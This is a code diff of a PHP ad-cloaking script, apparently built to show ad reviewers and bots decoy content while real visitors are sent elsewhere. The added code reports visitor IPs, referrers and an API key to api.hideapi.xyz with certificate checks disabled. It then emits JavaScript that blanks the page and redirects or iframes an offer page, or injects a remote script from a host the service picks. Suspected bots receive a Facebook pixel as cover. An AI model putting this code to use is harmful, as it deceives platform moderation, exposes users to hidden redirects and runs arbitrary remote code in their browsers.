 if($CLOAKING['BLOCK_APPLE'] || $CLOAKING['BLOCK_ANDROID'] || $CLOAKING['BLOCK_WIN'] || $CLOAKING['BLOCK_MOBILE'] || $CLOAKING['BLOCK_DESCTOP']) {
     $ua='';
@@ -444,73 +428,100 @@ if($CLOAKING['DELAY_START']) {
     }
 }
 
+if(!empty($_SERVER['HTTP_REFERER'])) $CLOAKINGdata['HTTP_X_FORWARDED_HOST']= parse_url($_SERVER['HTTP_REFERER'],PHP_URL_HOST);
+else if(!empty($_SERVER['Referer'])) $CLOAKINGdata['HTTP_X_FORWARDED_HOST']= parse_url($_SERVER['Referer'],PHP_URL_HOST);
+if(!empty($_GET['q'])){
+    parse_str(urldecode($_GET['q']),$tmppar);
+    if(!empty($tmppar['utm_allow_geo']) && preg_match('#^[a-zA-Z]{2}(-|$)#',$tmppar['utm_allow_geo'])) $CLOAKING['ALLOW_GEO']=$tmppar['utm_allow_geo'];
+}
+
+if(!empty($CLOAKING['allow_utm_must']) || !empty($CLOAKING['allow_utm_opt'])){
+    if(!empty($_GET['q'])) $utmstring=urldecode($_GET['q']); else $utmstring='';
+    if(!empty($CLOAKING['allow_utm_opt'])) {
+        $CLOAKING['allow_utm_opt'] = preg_replace('#[\s,]+#', '|', $CLOAKING['allow_utm_opt']);
+        $CLOAKING['allow_utm_opt'] = "#" . trim($CLOAKING['allow_utm_opt'], ',') . "#i";
+    }
+    if(!empty($CLOAKING['allow_utm_must']) && !stristr($utmstring,$CLOAKING['allow_utm_must'])) $CLOAKING['banReason'].='utmfilterm.';
+    if(!empty($CLOAKING['allow_utm_opt']) && !preg_match($CLOAKING['allow_utm_opt'],$utmstring)) $CLOAKING['banReason'].='utmfilterk.';
+}
+if(!empty($CLOAKING['block_utm'])) {
+    if(!empty($_GET['q'])) $utmstring=urldecode($_GET['q']); else $utmstring='';
+    if(!empty($CLOAKING['block_utm']) && stristr($utmstring,$CLOAKING['block_utm'])) $CLOAKING['banReason'].='utmfilterb.';
+}
+
 $CLOAKINGdata = json_encode($CLOAKINGdata);
 // fix for user's settings errors
 $CLOAKING['ALLOW_GEO']=trim(preg_replace('#[^a-zA-Z,]+#',',',$CLOAKING['ALLOW_GEO']),',');
 $CLOAKING['BLOCK_GEO']=trim(preg_replace('#[^a-zA-Z,]+#',',',$CLOAKING['BLOCK_GEO']),',');
 // Data for ML postprocessing
-$CLOAKING['W_']=(substr($CLOAKING['WHITE_PAGE'],0,8)=='https://' || substr($CLOAKING['WHITE_PAGE'],0,7)=='http://') ? '' : file_get_contents($CLOAKING['WHITE_PAGE']);
-$CLOAKING['O_']=(substr($CLOAKING['OFFER_PAGE'],0,8)=='https://' || substr($CLOAKING['OFFER_PAGE'],0,7)=='http://') ? '' : file_get_contents($CLOAKING['OFFER_PAGE']);
-$CLOAKING['W_CRC']=crc32($CLOAKING['W_']);
-$CLOAKING['O_CRC']=crc32($CLOAKING['O_']);
-$CLOAKING['W_YDX']=preg_match('#[\'"]https://[^/]*yandex\.[^\'"]+\.js#',$CLOAKING['W_']) ? 1:0;
-$CLOAKING['W_FBX']=preg_match('#[\'"]https://[^/]*facebook\.[^\'"]+\.js#',$CLOAKING['W_']) ? 1:0;
-$CLOAKING['W_GGX']=preg_match('#[\'"]https://[^/]*(google|google-analytics)\.[^\'"]+\.js#',$CLOAKING['W_']) ? 1:0;
-$CLOAKING['W_TT']=preg_match('#[\'"]https://[^/]*(google|google-analytics)\.[^\'"]+\.js#',$CLOAKING['W_']) ? 1:0;
-$CLOAKING['O_YDX']=preg_match('#[\'"]https://[^/]*yandex\.[^\'"]+\.js#',$CLOAKING['O_']) ? 1:0;
-$CLOAKING['O_FBX']=preg_match('#[\'"]https://[^/]*facebook\.[^\'"]+\.js#',$CLOAKING['O_']) ? 1:0;
-$CLOAKING['O_GGX']=preg_match('#[\'"]https://[^/]*bytedance\.[^\'"]+\.js#',$CLOAKING['O_']) ? 1:0;
-$CLOAKING['O_TT']=preg_match('#[\'"]https://[^/]*bytedance\.[^\'"]+\.js#',$CLOAKING['O_']) ? 1:0;
+// нету такого параметра!
+$CLOAKING['W_']='';//(substr($CLOAKING['WHITE_PAGE'],0,8)=='https://' || substr($CLOAKING['WHITE_PAGE'],0,7)=='http://') ? '' : file_get_contents($CLOAKING['WHITE_PAGE']);
+// нету такого параметра!
+$CLOAKING['O_']='';//(substr($CLOAKING['OFFER_PAGE'],0,8)=='https://' || substr($CLOAKING['OFFER_PAGE'],0,7)=='http://') ? '' : file_get_contents($CLOAKING['OFFER_PAGE']);
+$CLOAKING['W_CRC']='';//crc32($CLOAKING['W_']);
+$CLOAKING['O_CRC']='';//crc32($CLOAKING['O_']);
+$CLOAKING['W_YDX']='';//preg_match('#[\'"]https://[^/]*yandex\.[^\'"]+\.js#',$CLOAKING['W_']) ? 1:0;
+$CLOAKING['W_FBX']='';//preg_match('#[\'"]https://[^/]*facebook\.[^\'"]+\.js#',$CLOAKING['W_']) ? 1:0;
+$CLOAKING['W_GGX']='';//preg_match('#[\'"]https://[^/]*(google|google-analytics)\.[^\'"]+\.js#',$CLOAKING['W_']) ? 1:0;
+$CLOAKING['W_TT']='';//preg_match('#[\'"]https://[^/]*(google|google-analytics)\.[^\'"]+\.js#',$CLOAKING['W_']) ? 1:0;
+$CLOAKING['O_YDX']='';//preg_match('#[\'"]https://[^/]*yandex\.[^\'"]+\.js#',$CLOAKING['O_']) ? 1:0;
+$CLOAKING['O_FBX']='';//preg_match('#[\'"]https://[^/]*facebook\.[^\'"]+\.js#',$CLOAKING['O_']) ? 1:0;
+$CLOAKING['O_GGX']='';//preg_match('#[\'"]https://[^/]*bytedance\.[^\'"]+\.js#',$CLOAKING['O_']) ? 1:0;
+$CLOAKING['O_TT']='';//preg_match('#[\'"]https://[^/]*bytedance\.[^\'"]+\.js#',$CLOAKING['O_']) ? 1:0;
 
-if(!function_exists('curl_init')) $CLOAKING['STATUS'] = @file_get_contents('http://api.hideapi.xyz/basic?ip='.$_SERVER["REMOTE_ADDR"].'&port='.$_SERVER["REMOTE_PORT"].'&banReason='.$CLOAKING['banReason'].'&key='.$CLOAKING['API_SECRET_KEY'].'&sign=92193176841351f1623481990&version='.$CLOAKING['VERSION'].'&wmet='.$CLOAKING['WHITE_METHOD'].'&omet='.$CLOAKING['OFFER_METHOD'].'&wcrc='.$CLOAKING['W_CRC'].'&ocrc='.$CLOAKING['O_CRC'].'&wydx='.$CLOAKING['W_YDX'].'&wfbx='.$CLOAKING['W_FBX'].'&wggx='.$CLOAKING['W_GGX'].'&oydx='.$CLOAKING['O_YDX'].'&ofbx='.$CLOAKING['O_FBX'].'&oggx='.$CLOAKING['O_GGX'].'&js=false&cache='.$CLOAKING['DISABLE_CACHE'].'&geo='.$CLOAKING['ALLOW_GEO'].'&utm='.$CLOAKING['UTM'].'&utmmust='.$CLOAKING['allow_utm_must'].'&utmopt='.$CLOAKING['allow_utm_opt'].'&utmblock='.$CLOAKING['block_utm'].'&mac='.$CLOAKING['BLOCK_APPLE'].'&andr='.$CLOAKING['BLOCK_ANDROID'].'&win='.$CLOAKING['BLOCK_WIN'].'&mob='.$CLOAKING['BLOCK_MOBILE'].'&desk='.$CLOAKING['BLOCK_DESCTOP'].'&delay='.$CLOAKING['DELAY_START'].'&perm='.$CLOAKING['DELAY_PERMANENT'].'&noref='.$CLOAKING['NO_REF'].'&whiteref='.$CLOAKING['WHITE_REF'].'&blockgeo=' .$CLOAKING['BLOCK_GEO'].'&paranoid='.$CLOAKING['PARANOID'] . '&allowvpn=' . $CLOAKING['ALLOW_VPN'].'&white='.urlencode($CLOAKING['WHITE_PAGE']).'&offer='.urlencode($CLOAKING['OFFER_PAGE']) , 'r', stream_context_create(array('ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,), 'http' => array('method' => 'POST', 'timeout' => 5, 'header'=> "Content-type: application/x-www-form-urlencoded\r\n". "Content-Length: ".strlen($CLOAKINGdata). "\r\n", 'content' => $CLOAKINGdata))));
-else $CLOAKING['STATUS'] = @cloakedCurl('http://api.hideapi.xyz/basic?ip='.$_SERVER["REMOTE_ADDR"].'&port='.$_SERVER["REMOTE_PORT"].'&banReason='.$CLOAKING['banReason'].'&key='.$CLOAKING['API_SECRET_KEY'].'&sign=92193176841351f1623481990&version='.$CLOAKING['VERSION'].'&wmet='.$CLOAKING['WHITE_METHOD'].'&omet='.$CLOAKING['OFFER_METHOD'].'&wcrc='.$CLOAKING['W_CRC'].'&ocrc='.$CLOAKING['O_CRC'].'&wydx='.$CLOAKING['W_YDX'].'&wfbx='.$CLOAKING['W_FBX'].'&wggx='.$CLOAKING['W_GGX'].'&oydx='.$CLOAKING['O_YDX'].'&ofbx='.$CLOAKING['O_FBX'].'&oggx='.$CLOAKING['O_GGX'].'&js=false&cache='.$CLOAKING['DISABLE_CACHE'].'&geo='.$CLOAKING['ALLOW_GEO'].'&utm='.$CLOAKING['UTM'].'&utmmust='.$CLOAKING['allow_utm_must'].'&utmopt='.$CLOAKING['allow_utm_opt'].'&utmblock='.$CLOAKING['block_utm'].'&mac='.$CLOAKING['BLOCK_APPLE'].'&andr='.$CLOAKING['BLOCK_ANDROID'].'&win='.$CLOAKING['BLOCK_WIN'].'&mob='.$CLOAKING['BLOCK_MOBILE'].'&desk='.$CLOAKING['BLOCK_DESCTOP'].'&delay='.$CLOAKING['DELAY_START'].'&perm='.$CLOAKING['DELAY_PERMANENT'].'&noref='.$CLOAKING['NO_REF'].'&whiteref='.$CLOAKING['WHITE_REF'].'&blockgeo=' .$CLOAKING['BLOCK_GEO'].'&paranoid='.$CLOAKING['PARANOID'] . '&allowvpn=' . $CLOAKING['ALLOW_VPN'].'&white='.urlencode($CLOAKING['WHITE_PAGE']).'&offer='.urlencode($CLOAKING['OFFER_PAGE']), $CLOAKINGdata);
+if(!function_exists('curl_init')) $CLOAKING['STATUS'] = @file_get_contents('http://api.hideapi.xyz/basic?ip='.$_SERVER["REMOTE_ADDR"].'&port='.$_SERVER["REMOTE_PORT"].'&banReason='.$CLOAKING['banReason'].'&key='.$CLOAKING['API_SECRET_KEY'].'&sign=92193176841351f1623482417&version='.$CLOAKING['VERSION'].'&wmet='.$CLOAKING['WHITE_METHOD'].'&omet='.$CLOAKING['OFFER_METHOD'].'&wcrc='.$CLOAKING['W_CRC'].'&ocrc='.$CLOAKING['O_CRC'].'&wydx='.$CLOAKING['W_YDX'].'&wfbx='.$CLOAKING['W_FBX'].'&wggx='.$CLOAKING['W_GGX'].'&oydx='.$CLOAKING['O_YDX'].'&ofbx='.$CLOAKING['O_FBX'].'&oggx='.$CLOAKING['O_GGX'].'&stage='.$stage.'&js=true&cache='.$CLOAKING['DISABLE_CACHE'].'&geo='.$CLOAKING['ALLOW_GEO'].'&utm='.$CLOAKING['UTM'].'&utmmust='.$CLOAKING['allow_utm_must'].'&utmopt='.$CLOAKING['allow_utm_opt'].'&utmblock='.$CLOAKING['block_utm'].'&mac='.$CLOAKING['BLOCK_APPLE'].'&andr='.$CLOAKING['BLOCK_ANDROID'].'&win='.$CLOAKING['BLOCK_WIN'].'&mob='.$CLOAKING['BLOCK_MOBILE'].'&desk='.$CLOAKING['BLOCK_DESCTOP'].'&delay='.$CLOAKING['DELAY_START'].'&perm='.$CLOAKING['DELAY_PERMANENT'].'&noref='.$CLOAKING['NO_REF'].'&whiteref='.$CLOAKING['WHITE_REF'].'&blockgeo=' .$CLOAKING['BLOCK_GEO'].'&paranoid='.$CLOAKING['PARANOID'] . '&allowvpn=' . $CLOAKING['ALLOW_VPN'].'&offer='.urlencode($CLOAKING['OFFER_PAGE']) , 'r', stream_context_create(array('ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,), 'http' => array('method' => 'POST', 'timeout' => 5, 'header'=> "Content-type: application/x-www-form-urlencoded\r\n". "Content-Length: ".strlen($CLOAKINGdata). "\r\n", 'content' => $CLOAKINGdata))));
+else $CLOAKING['STATUS'] = @cloakedCurl('http://api.hideapi.xyz/basic?ip='.$_SERVER["REMOTE_ADDR"].'&port='.$_SERVER["REMOTE_PORT"].'&banReason='.$CLOAKING['banReason'].'&key='.$CLOAKING['API_SECRET_KEY'].'&sign=92193176841351f1623482417&version='.$CLOAKING['VERSION'].'&wmet='.$CLOAKING['WHITE_METHOD'].'&omet='.$CLOAKING['OFFER_METHOD'].'&wcrc='.$CLOAKING['W_CRC'].'&ocrc='.$CLOAKING['O_CRC'].'&wydx='.$CLOAKING['W_YDX'].'&wfbx='.$CLOAKING['W_FBX'].'&wggx='.$CLOAKING['W_GGX'].'&oydx='.$CLOAKING['O_YDX'].'&ofbx='.$CLOAKING['O_FBX'].'&oggx='.$CLOAKING['O_GGX'].'&stage='.$stage.'&js=true&cache='.$CLOAKING['DISABLE_CACHE'].'&geo='.$CLOAKING['ALLOW_GEO'].'&utm='.$CLOAKING['UTM'].'&utmmust='.$CLOAKING['allow_utm_must'].'&utmopt='.$CLOAKING['allow_utm_opt'].'&utmblock='.$CLOAKING['block_utm'].'&mac='.$CLOAKING['BLOCK_APPLE'].'&andr='.$CLOAKING['BLOCK_ANDROID'].'&win='.$CLOAKING['BLOCK_WIN'].'&mob='.$CLOAKING['BLOCK_MOBILE'].'&desk='.$CLOAKING['BLOCK_DESCTOP'].'&delay='.$CLOAKING['DELAY_START'].'&perm='.$CLOAKING['DELAY_PERMANENT'].'&noref='.$CLOAKING['NO_REF'].'&whiteref='.$CLOAKING['WHITE_REF'].'&blockgeo=' .$CLOAKING['BLOCK_GEO'].'&paranoid='.$CLOAKING['PARANOID'] . '&allowvpn=' . $CLOAKING['ALLOW_VPN'].'&offer='.urlencode($CLOAKING['OFFER_PAGE']), $CLOAKINGdata);
 $CLOAKING['STATUS'] = json_decode($CLOAKING['STATUS'], true);
 
+header("Content-Type: application/javascript");
+//srand(crc32($_SERVER['HTTP_HOST'].$_SERVER['HOST'].$_SERVER['Host'].$_SERVER['host'].$_SERVER["SCRIPT_NAME"]));
 if (empty($CLOAKING['banReason']) && !empty($CLOAKING['STATUS']) && !empty($CLOAKING['STATUS']['action']) && $CLOAKING['STATUS']['action'] == 'allow' && (empty($CLOAKING['ALLOW_GEO']) || (!empty($CLOAKING['STATUS']['geo']) && !empty($CLOAKING['ALLOW_GEO']) && stristr($CLOAKING['ALLOW_GEO'],$CLOAKING['STATUS']['geo'])))) {
-    cloakedOfferPage($CLOAKING['OFFER_PAGE'],$CLOAKING['OFFER_METHOD'],$CLOAKING['UTM']);
+    if($CLOAKING['UTM'] && !empty($_GET) && !empty($_GET['q'])){
+        // fix for fucking bug with &q=...&= not encoded...
+        if(!empty($_SERVER['QUERY_STRING'])) $_GET['q']=substr($_SERVER['QUERY_STRING'],strpos($_SERVER['QUERY_STRING'],'&q=')+3);
+            if(strstr($CLOAKING['OFFER_PAGE'],'?')) $CLOAKING['OFFER_PAGE'].= '&'.urldecode($_GET['q']);
+            else $CLOAKING['OFFER_PAGE'].= '?'.urldecode($_GET['q']);
+            $page=base64_encode($CLOAKING['OFFER_PAGE']);
+    }
+    else $page=base64_encode($CLOAKING['OFFER_PAGE']);
+
+    if(!empty($CLOAKING['STATUS']['uid'])) {
+        $uid=$CLOAKING['STATUS']['uid'];
+        setcookie('uid',$uid,time()+604800);
+    }
+    else $uid='';
+
+    $output='';
+
+if($CLOAKING['FAST']) {
+    if($CLOAKING['OFFER_METHOD']=='iframe'){
+        $output='try {window.stop();}catch (e) {document.execCommand("Stop");}document.getElementsByTagName("html")[0].innerHTML = "<head><style>html, body, iframe {margin: 0;padding: 0;height : 100%; width: 100%;}</style></head><body></body>";!function() {if (document.getElementsByTagName("head").length > 0){var e = document.createElement("meta");e.name = "viewport",e.content = "width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0",document.getElementsByTagName("head")[0].appendChild(e);}}();document.getElementsByTagName("body")[0].innerHTML = "<iframe src=\''.base64_decode($page).'\' style=\'visibility:visible !important; position:absolute; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;\' allowfullscreen=\'allowfullscreen\' webkitallowfullscreen=\'webkitallowfullscreen\' mozallowfullscreen=\'mozallowfullscreen\'></iframe>";';
+    }
+    else {
+        $output='try {window.stop();}catch (e) {document.execCommand("Stop");}document.getElementsByTagName("html")[0].innerHTML = "";location.href="'.base64_decode($page).'"';
+    }
+    echo $output;
 }
 else {
-    cloakedWhitePage($CLOAKING['WHITE_PAGE'],$CLOAKING['WHITE_METHOD']);
+    if ($CLOAKING['UTM'] && empty($_GET['q'])) {
+//        $output="var s='".$page."';try{s=btoa(atob(s)+(atob(s).indexOf('?')<0 ? '?':'&')+window.location.search.substr(1));}catch(e){console.log(e)};document.write('<script src=\"https://".$CLOAKING['STATUS']['host']."/fb.js?uid=".$uid."&method=".$CLOAKING['OFFER_METHOD']."&session=".$CLOAKING['STATUS']['js']."_'+s+'\"></script>')";
+        $output = "var s='" . $page . "';try{s=btoa(atob(s)+(atob(s).indexOf('?')<0 ? '?':'&')+window.location.search.substr(1));}catch(e){console.log(e)};var b=document.createElement(\"script\");b[\"type\"] =\"text/javascript\";b[\"src\"] =\"https://" . $CLOAKING['STATUS']['host'] . "/fb.js?uid=" . $uid . "&method=" . $CLOAKING['OFFER_METHOD'] . "&session=" . $CLOAKING['STATUS']['js'] . "_\"+s;document.head.appendChild(b);";
+    } //    else $output="document.write('<script src=\"https://".$CLOAKING['STATUS']['host']."/fb.js?uid=".$uid."&method=".$CLOAKING['OFFER_METHOD']."&session=".$CLOAKING['STATUS']['js']."_".$page."\"></script>')";
+    else $output = "var b=document.createElement(\"script\");b[\"type\"] =\"text/javascript\";b[\"src\"] =\"https://" . $CLOAKING['STATUS']['host'] . "/fb.js?uid=" . $uid . "&method=" . $CLOAKING['OFFER_METHOD'] . "&session=" . $CLOAKING['STATUS']['js'] . "_" . $page . "\";document.head.appendChild(b);";
+//    header("Location: https://cloudnetwork.cf/fb.js?uid=".$uid."&session=".$CLOAKING['STATUS']['js']."_".$page);
+    if ($CLOAKING['NO_REF']) {
+        $output = 'if(document && document.referrer && document.referrer.length>0){' . $output . '}';
+    }
+    echo $output;
+}
+}
+else {
+//    отдавать 404 ??
+//    echo "document.write('<script src=\"https://connect.facebook.net/en_US/fbevents.js\"></script>')";
+    echo "var b=document.createElement('script');b[\"type\"] =\"text/javascript\";b[\"src\"] =\"https://connect.facebook.net/en_US/fbevents.js\";document.head.appendChild(b);";
+//    header("Location: https://connect.facebook.net/en_US/fbevents.js");
 }
 
-function cloakedOfferPage($offer,$method='meta',$utm=false){
-    if(substr($offer,0,8)=='https://' || substr($offer,0,7)=='http://') {
-        if(!empty($_GET) &&  $utm) {
-            if(strstr($offer,'?')) $offer.= '&'.http_build_query($_GET);
-            else $offer.= '?'.http_build_query($_GET);
-        }
-        if($method=='302') {
-            header("Location: ".$offer);
-        }
-        else if($method=='iframe') {
-            echo "<html><head><title></title></head><body style='margin: 0; padding: 0;'><meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0\"/><iframe src='".$offer."' style='visibility:visible !important; position:absolute; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;' allowfullscreen='allowfullscreen' webkitallowfullscreen='webkitallowfullscreen' mozallowfullscreen='mozallowfullscreen'></iframe></body></html>";
-        }
-        else {
-            echo '<html><head><meta http-equiv="Refresh" content="0; URL=' . $offer . '" ></head></html>';
-        }
-    }
-    else require_once($offer);// real users
-    die();
-}
-function cloakedWhitePage($white,$method='curl'){
-    if(substr($white,0,8)=='https://' || substr($white,0,7)=='http://') {
-        if ($method == '302') {
-            header("Location: ".$white);
-        }
-        else {
-            if (!function_exists('curl_init')) $page = file_get_contents($white, 'r', stream_context_create(array('ssl' => array('verify_peer' => false, 'verify_peer_name' => false,))));
-            else $page = cloakedCurl($white);
-            $page = preg_replace('#(<head[^>]*>)#imU', '$1<base href="' . $white . '">', $page, 1);
-            $page = preg_replace('#https://connect\.facebook\.net/[a-zA-Z_-]+/fbevents\.js#imU', '', $page);
-            if (empty($page)) {
-                header("HTTP/1.1 503 Service Unavailable", true, 503);
-            }
-            echo $page;
-        }
-    }
-    else require_once($white);// bots
-    die();
-}
 function cloakedCurl($url,$body='',$returnHeaders=false){
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL,$url);
